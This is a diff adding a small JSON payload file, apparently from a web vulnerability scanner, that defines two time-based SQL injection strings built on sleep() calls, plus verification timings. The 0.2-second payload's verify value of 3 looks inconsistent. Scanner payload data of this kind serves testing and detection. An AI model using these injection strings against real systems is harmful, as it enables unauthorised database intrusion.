@@ -1,0 +1,20 @@
+{
+    "description": "Time-based SQL Injection",
+    "vulnerability": "PTV-WEB-SANIT-SQLINJ",
+    "payloads": [
+        {
+            "payload": "' OR sleep(3) OR 'a'='",
+            "verify": [
+                3
+            ],
+            "type": "time"
+        },
+        {
+            "payload": "' AND sleep(0.2) OR 'a'='",
+            "verify": [
+                3
+            ],
+            "type": "time"
+        }
+    ]
+}
